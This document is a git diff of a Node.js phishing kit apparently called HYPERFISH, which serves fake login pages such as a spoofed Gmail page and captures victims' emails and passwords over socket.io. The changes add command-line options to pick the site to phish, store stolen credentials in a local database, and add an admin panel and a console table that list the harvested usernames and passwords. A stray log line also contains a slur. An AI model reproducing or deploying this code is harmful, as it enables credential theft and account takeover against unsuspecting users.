@@ -1,16 +1,17 @@
 var express = require('express');
+var keypress = require('keypress');
 var app = express();
+var admin_app = express();
 var http = require('http').Server(app);
 var io = require('socket.io')(http);
 var colors = require('colors/safe');
 const args = require('yargs').argv;
-var loki = require('lokijs')
+var Table = require('cli-table');
 fs = require('fs');
-var db = new loki(__dirname + '/db/credentials.json')
 var port = args.port
 var type = args.kind
-var GMAILCREDENTIALS = db.addCollection('GMAIL')
-
+var Nedb = require('nedb')
+var webUi = "False";
 var art1 = `
 ██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗██╗███████╗██╗  ██╗
 ██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝██║  ██║
@@ -42,71 +43,127 @@ var MOTD = [
   'NEMESYS43 WUZ HERE'
 ]
 
+var options = require( "yargs" )  
+.usage( "\nUsage: $0  [--kind=Gmail]" )
+.command( "--port=", "--kind=")
+.required( 'kind')
+.option( "kind", { describe: "sets the site to phish", type: "string" } )
+.option( "port", { describe: "sets the port to use default is 80", type: "string" } )
+.option( "webui", { describe: "sets if you want to run the web UI",} )
+.help( "?" )
+.alias( "?", "help" )
+.example( "$0 --port=8080 --kind=Gmail" , "Opens a fake Gmail login page on port 8080" )
+.epilog( "Copyright 2018 NEMESYS43" )
+.argv;
+
+var url = args.kind;
+
+if(!options.port){
+  port = '80'
+}
+if(args.webui){
+  webUi= "True"
+}
+
+
   var selectedMOTD = MOTD[Math.floor(Math.random() * 5)];
 
 
 app.get('/', function(req, res){
-  /*res.sendFile(__dirname + '/Gmail/index.html' , __dirname + '/Gmail/style.css');
-  res.sendFile(__dirname + '/Gmail/grid.png');
-  res.sendFile(__dirname + '/Gmail/style.css');
-  res.sendFile(__dirname + '/Gmail/profile-img.png');*/
   app.use(express.static(__dirname + '/' + type));
   res.sendFile(__dirname + '/'+ type +'/index.html')
 });
-    
+app.get('/adminPanel', function(req, res){
+  if (webUi == "True"){
+  app.use(express.static(__dirname + '/adminpanel'));
+  res.sendFile(__dirname + '/adminpanel/index.html')
+  }else{
+    app.use(express.static(__dirname + '/' + type));
+    res.sendFile(__dirname + '/'+ type +'/404.html')
+  }
+});
     
     io.on('connection', function(socket){
-        var address = socket.handshake.address;
+           var address = socket.handshake.address;
+           console.log(colors.green('[+]') + colors.white(' A user connected from' + address));
+           socket.on('UsernameEmail',function(email, from){
+           console.log(colors.green('[+]') + colors.white('Captured Email -> ')+ colors.blue(email) +  'from ' + from);
+           storedEmail = email
+        })
+        socket.on('Password',function(password, from){
+          console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password) + ' from ' + from);
+          gmail.insert({ gmail: storedEmail, password: password }, function (err) {});
+        })
 
 
+        socket.on('queryCredentials', function(){
+          console.log("nagger")
 
-        console.log(colors.green('[+]') + colors.white(' A user connected from' + address));
-
-
-        socket.on('GmailEmail',function(email){
-          //when user submits email part of gmail form
-          
-          console.log(colors.green('[+]') + colors.white('Captured Email -> ')+ colors.blue(email));
-
-          //write to file
-          fs.appendFile('GMAILCREDENTIALS.txt','\r\n\r\n' + email , function (err) {
-            if (err) return console.log(err);
-            console.log(colors.green('[+]') + colors.white('Wrote Email To FIle ----> '));
+          gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
+            docs.forEach(function(d){
+              socket.emit('queriedCredentials',d.gmail, d.password)
+            });  
           });
 
-
-        })
-        socket.on('GmailPassword',function(password){
-          //when user submits email part of gmail form
           
-          console.log(colors.green('[+]') + colors.white('Captured Password -> ')+ colors.blue(password));
-          
-
-          fs.appendFile('GMAILCREDENTIALS.txt', '\r\n' + password+'', function (err) {
-            if (err) return console.log(err);
-            console.log(colors.green('[+]') + colors.white('Wrote Password To FIle ----> '));
-          });
-
         })
+
+
       });
 
 
 
   app.set('port', process.env.PORT || 3000);
   http.listen(port, function(){
+    console.log(colors.green('[+]') + colors.white(' listening on *:'+ port));
+  });
+
   console.log(colors.blue.bold(art1) + colors.cyan('   by NEMESYS43'))
   console.log(colors.yellow.bold('                       ' + selectedMOTD));
   console.log('\n\n\n')
-  
+
+  gmail = new Nedb({ filename: 'db/gmail.db', autoload: true });
+  webUser = new Nedb({ filename: 'db/webUser.db', autoload: true });
+
 
   if (sites.indexOf(type) >= 0) {
     // do stuff here
     console.log(colors.green('[+]') + colors.white(' Found Site '+ type));
-    console.log(colors.green('[+]') + colors.white(' listening on *:'+ port));
+
+    keypress(process.stdin);
+    
+   // listen for the "keypress" event 
+   process.stdin.on('keypress', function (ch, key) {
+     if (key.name == 'l') {
+       showLog()
+     }else if(key && key.ctrl && key.name == 'c'){
+       process.exit();
+     }
+   });
+    
+   process.stdin.setRawMode(true);
+   process.stdin.resume();
+
+
   }else{
     console.log(colors.red('[!]') + colors.white(' Failed to find Site '+ type));
     console.log(colors.red('[!]') + colors.white(' Quiting'));
     process.exit()
   }
+
+
+
+function showLog(){
+  console.log(colors.green('[+]') + colors.white(' Showing Logs'));
+
+  var table = new Table({head: ['Username', 'Password'], colWidths: [35, 35]});
+
+
+
+    gmail.find({}).sort({gmail: 1}).exec(function(err, docs) {  
+      docs.forEach(function(d) {table.push([d.gmail, d.password]);  
+    });
+    console.log(table.toString());
 });
+}
 
